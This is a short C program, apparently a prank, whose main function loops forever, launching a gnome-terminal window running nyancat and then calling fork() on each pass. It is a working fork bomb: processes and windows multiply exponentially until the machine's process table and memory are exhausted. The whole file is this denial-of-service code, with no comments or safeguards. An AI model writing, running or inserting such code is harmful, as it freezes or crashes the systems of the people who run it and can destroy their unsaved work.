#include <unistd.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    while (1) {
        system("gnome-terminal --wait -- nyancat");
        fork();
    }

    return 0;
}
